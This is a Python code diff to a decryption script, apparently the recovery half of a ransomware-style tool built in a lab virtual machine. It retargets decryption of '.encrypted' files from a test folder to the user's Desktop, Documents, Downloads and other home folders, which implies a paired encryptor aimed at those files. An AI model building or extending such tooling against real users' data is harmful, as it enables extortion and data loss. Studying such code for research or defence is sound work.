@@ -9,7 +9,21 @@ else:
 
 KEY_FILE = os.path.join(BASE_DIR, "key.key")
 
-TARGET_FOLDER = os.path.join(BASE_DIR, "carpeta_prueba")
+TARGET_FOLDER = os.path.expanduser("~")
+# TARGET_FOLDER = "/home/vboxuser/Documents/archivos_importantes"
+
+home = os.path.expanduser("~")
+
+folders = [
+    "Desktop",
+    "Documents",
+    "Downloads",
+    "Music",
+    "Pictures",
+    "Public",
+    "Templates",
+    "Videos"
+]
 
 
 def load_key():
@@ -45,18 +59,21 @@ def decrypt_file(file_path, cipher):
         print(f"No se pudo descifrar: {file_path}")
 
 
-def decrypt_folder(folder_path, cipher):
-    """Recorre la carpeta buscando archivos cifrados"""
+def decrypt_folder(folders, cipher):
 
-    for root, directories, files in os.walk(folder_path):
+    for folder in folders:
 
-        for file in files:
+        folder_path = os.path.join(home, folder)
 
-            file_path = os.path.join(root, file)
+        for root, directories, files in os.walk(folder_path):
 
-            # Solo descifrar archivos .encrypted
-            if file.endswith(".encrypted"):
-                decrypt_file(file_path, cipher)
+            for file in files:
+
+                file_path = os.path.join(root, file)
+
+                # Solo descifrar archivos .encrypted
+                if file.endswith(".encrypted"):
+                    decrypt_file(file_path, cipher)
 
 
 if __name__ == "__main__":
